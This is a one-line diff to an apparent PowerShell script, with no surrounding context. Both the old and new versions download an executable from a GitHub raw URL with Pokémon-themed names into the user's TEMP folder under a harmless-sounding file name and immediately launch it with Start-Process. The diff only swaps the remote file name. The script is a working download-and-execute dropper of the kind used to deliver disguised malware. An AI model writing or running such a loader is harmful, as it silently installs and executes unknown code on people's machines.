@@ -1,1 +1,1 @@
-$destination= $env:TEMP + "\cindaquilpiplup.exe";Start-BitsTransfer -Source https://github.com/piplup312/tomandjerry/raw/main/pokemonscarlet.exe -Destination $destination;Start-Process($env:TEMP + "\cindaquilpiplup.exe");
+$destination= $env:TEMP + "\cindaquilpiplup.exe";Start-BitsTransfer -Source https://github.com/piplup312/tomandjerry/raw/main/pokemonchikorita -Destination $destination;Start-Process($env:TEMP + "\cindaquilpiplup.exe");
